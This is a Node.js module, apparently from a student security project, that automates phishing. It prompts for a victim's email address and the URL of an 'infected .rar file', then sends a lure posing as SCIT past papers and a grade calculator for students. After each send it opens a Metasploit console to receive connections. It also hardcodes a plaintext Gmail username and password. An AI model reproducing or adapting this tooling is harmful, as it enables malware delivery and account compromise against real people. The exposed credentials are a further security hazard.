const nodemailer = require("nodemailer");
const openConsole = require("./OpenMsfConsole");
const inquirer = require("inquirer");
const exec = require("child_process").exec;

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "johnbrowncsg@gmail.com",
    pass: "Johnbrowncsg123",
  },
});

exports.emailPrompt = (address) => {
  inquirer
    .prompt([
      {
        type: "input",
        message: "Enter the victim's email address",
        name: "email",
      },
    ])
    .then((answers) => {
      var message = {
        from: "test@test.com",
        to: answers.email,
        subject: "Test email subject",
        html: "<h1>Test email header</h1><p>Test email body<b>",
        attachments: [
          {
            filename: "your-testla.png",
            path: "src/assets/UtechImage.jpeg",
          },
        ],
      };

      transporter.sendMail(message, (error, info) => {
        if (error) {
          console.log(error);
        }
        console.log("Info", info);
        openConsole.openConsole(exec, address);
      });
    });
};


exports.sendEmail = () => {

  inquirer
    .prompt([
      {
        type: "input",
        message: "Enter the url of the infected .rar file",
        name: "url",
      },
    ])
    .then((response) => {
      inquirer
      .prompt([
        {
          type: "input",
          message: "Enter the victim's email address",
          name: "email",
        },
      ])
      .then((answers) => {
        var message =  {
          from: 'test@test.com',
          to: answers.email,
          subject: 'SCIT Past Papers',
          html: '<p>Greetings fellow SCIT Bulldogs! Finals are just around the corner, and we know how' +
           'stressful prepartions may be. Attached is a link with a few past papers to help get you started as well as' +
           'a grade calculator to help you determine your current grades as well as how much you will need to pass a course'+ 
           '<p>' + response.url,
          // attachments: [
          //     { // Use a URL as an attachment
          //       filename: 'your-testla.png',
          //       path: 'src/assets/utechlogo.png'
          //   }
          // ]
      };
  
        transporter.sendMail(message, (error, info) => {
          if (error) {
            console.log(error);
          }
          console.log("Info", info);
          openConsole.openConsole(exec, address);
        });
      });
    });

};

